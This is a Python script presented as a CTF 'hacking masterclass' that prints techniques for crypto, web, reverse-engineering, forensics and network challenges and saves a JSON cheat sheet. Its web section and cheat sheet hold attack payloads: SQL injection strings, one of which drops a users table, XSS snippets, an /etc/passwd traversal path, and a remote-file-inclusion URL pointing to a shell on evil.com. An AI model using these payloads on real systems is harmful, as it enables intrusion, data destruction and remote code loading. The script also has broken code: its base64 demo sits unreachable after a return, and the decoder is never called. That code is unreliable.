#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥🔥🔥 CTF HACKING MASTERCLASS 2025 🔥🔥🔥
💀 Complete Guide to CTF Challenges & Techniques
⚡ Educational & Authorized Testing Only!
"""

import base64
import string
import hashlib
import binascii
import subprocess
import sys
import os
import time
import json

class CTFMasterclass:
    def __init__(self):
        self.alphabet = string.ascii_lowercase
        self.techniques = []

    def cryptography_techniques(self):
        """🔐 เทคนิค Cryptography สำหรับ CTF"""
        print("🔐 CRYPTOGRAPHY TECHNIQUES")
        print("=" * 40)
        
        # 1. Caesar Cipher
        print("\n1. 🔄 Caesar Cipher")
        print("Code:")
        
        def caesar_cipher(text, shift):
            result = ""
            for char in text:
                if char.isalpha():
                    ascii_offset = 65 if char.isupper() else 97
                    result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
                else:
                    result += char
            return result

        def caesar_bruteforce(ciphertext):
            print("Caesar Cipher Bruteforce:")
            for shift in range(26):
                decrypted = caesar_cipher(ciphertext, -shift)
                print(f"Shift {shift:2d}: {decrypted}")
        
        # ตัวอย่าง
        cipher_text = "WKLV LV D VHFUHW"
        print(f"Ciphertext: {cipher_text}")
        caesar_bruteforce(cipher_text)
        
        # 2. Base64 Multi-layer Decode
        print("\n2. 📝 Base64 Multi-layer Decode")
        print("Code:")
        
        def base64_multilayer_decode(data, max_layers=10):
            print(f"Original data: {data}")
            current = data
            
            for layer in range(max_layers):
                try:
                    if isinstance(current, str):
                        current = current.encode()
                    
                    decoded = base64.b64decode(current)
                    current = decoded.decode('utf-8', errors='ignore')
                    print(f"Layer {layer + 1}: {current}")
                    
                    # หยุดถ้าไม่ใช่ base64 อีกแล้ว
                    if not self.is_base64(current):
                        print(f"Final result: {current}")
                        break
                        
                except Exception as e:
                    print(f"Decode failed at layer {layer + 1}: {e}")
                    break
            
            return current

    def is_base64(self, s):
        try:
            if isinstance(s, str):
                s = s.encode()
            return base64.b64encode(base64.b64decode(s)) == s
        except Exception:
            return False
        
        # ตัวอย่าง multi-layer base64
        nested_b64 = "VkdoaGRGOXBjMTkwYUdseg=="
        base64_multilayer_decode(nested_b64)

    def web_exploitation_techniques(self):
        """🌐 เทคนิค Web Exploitation"""
        print("\n🌐 WEB EXPLOITATION TECHNIQUES")
        print("=" * 40)
        
        print("\n1. 💉 SQL Injection Techniques")
        print("Basic payloads:")
        
        sqli_payloads = [
            "' OR '1'='1",
            "' UNION SELECT username,password FROM users--",
            "'; DROP TABLE users; --",
            "' OR 1=1 LIMIT 1 OFFSET 0 --"
        ]
        
        for payload in sqli_payloads:
            print(f"  {payload}")
        
        print("\n2. 🔥 XSS Payloads")
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            print(f"  {payload}")

    def reverse_engineering_techniques(self):
        """🔧 เทคนิค Reverse Engineering"""
        print("\n🔧 REVERSE ENGINEERING TECHNIQUES")
        print("=" * 40)
        
        print("\n1. 🔍 Binary Analysis Tools")
        tools = [
            "strings - Extract readable strings",
            "objdump - Disassemble binary",
            "gdb - Debug binary",
            "radare2 - Analyze binary",
            "ghidra - Reverse engineering"
        ]
        
        for tool in tools:
            print(f"  {tool}")
        
        print("\n2. 🐍 Python Bytecode Analysis")
        print("Use `dis` module to analyze .pyc files")

    def pwn_exploitation_techniques(self):
        """💥 เทคนิค PWN/Binary Exploitation"""
        print("\n💥 PWN/BINARY EXPLOITATION")
        print("=" * 40)

        print("\n1. 📊 Buffer Overflow Basics")
        print("Common techniques:")
        
        techniques = [
            "Stack-based buffer overflow",
            "Return-to-libc",
            "ROP (Return Oriented Programming)",
            "Format string bugs",
            "Heap exploitation"
        ]
        
        for tech in techniques:
            print(f"  - {tech}")

    def forensics_techniques(self):
        """🔍 เทคนิค Digital Forensics"""
        print("\n🔍 DIGITAL FORENSICS")
        print("=" * 40)
        
        print("\n1. 🖼️ Image Forensics")
        tools = [
            "binwalk - Extract hidden files",
            "steghide - Steganography",
            "exiftool - Metadata analysis",
            "zsteg - LSB steganography"
        ]
        
        for tool in tools:
            print(f"  {tool}")
        
        print("\n2. 📁 File Analysis")
        file_tools = [
            "file - Identify file type",
            "hexdump - Hex analysis",
            "xxd - Hex dump",
            "volatility - Memory analysis"
        ]
        
        for tool in file_tools:
            print(f"  {tool}")

    def network_analysis_techniques(self):
        """🌐 เทคนิค Network Analysis"""
        print("\n🌐 NETWORK ANALYSIS")
        print("=" * 40)
        
        print("\n1. 📦 Packet Analysis")
        tools = [
            "wireshark - GUI packet analyzer",
            "tcpdump - Command line capture",
            "tshark - Terminal wireshark",
            "scapy - Python packet manipulation"
        ]
        
        for tool in tools:
            print(f"  {tool}")

    def generate_ctf_cheatsheet(self):
        """📋 สร้าง CTF Cheatsheet"""
        print("\n📋 GENERATING CTF CHEATSHEET...")
        
        cheatsheet = {
            "crypto": {
                "caesar": "Try all 26 shifts",
                "base64": "Look for = padding",
                "rot13": "Letter substitution",
                "xor": "Try single-byte keys"
            },
            "web": {
                "sqli": "' OR '1'='1",
                "xss": "<script>alert(1)</script>",
                "lfi": "../../../etc/passwd",
                "rfi": "http://evil.com/shell.txt"
            },
            "rev": {
                "strings": "strings binary",
                "objdump": "objdump -d binary",
                "gdb": "gdb binary",
                "radare2": "r2 binary"
            },
            "forensics": {
                "binwalk": "binwalk -e file",
                "steghide": "steghide extract -sf image.jpg",
                "exiftool": "exiftool image.jpg",
                "volatility": "volatility -f memory.dump pslist"
            }
        }
        
        with open('ctf_cheatsheet.json', 'w') as f:
            json.dump(cheatsheet, f, indent=2)
        
        print("✅ CTF Cheatsheet saved to 'ctf_cheatsheet.json'")

def main():
    print("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥")
    print("💀 CTF HACKING MASTERCLASS 2025 💀")
    print("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥")
    print("⚡ Complete CTF Techniques & Methodologies")
    print("⚠️ Educational & Authorized Testing Only!")
    
    masterclass = CTFMasterclass()
    
    techniques = [
        masterclass.cryptography_techniques,
        masterclass.web_exploitation_techniques,
        masterclass.reverse_engineering_techniques,
        masterclass.pwn_exploitation_techniques,
        masterclass.forensics_techniques,
        masterclass.network_analysis_techniques
    ]
    
    for technique in techniques:
        try:
            technique()
            time.sleep(1)
        except Exception as e:
            print(f"❌ Error in {technique.__name__}: {e}")
    
    # Generate cheatsheet
    masterclass.generate_ctf_cheatsheet()
    
    print("\n🎯 CTF MASTERCLASS COMPLETE!")
    print("💀 Happy Hacking! (Legally & Ethically)")

if __name__ == "__main__":
    main()
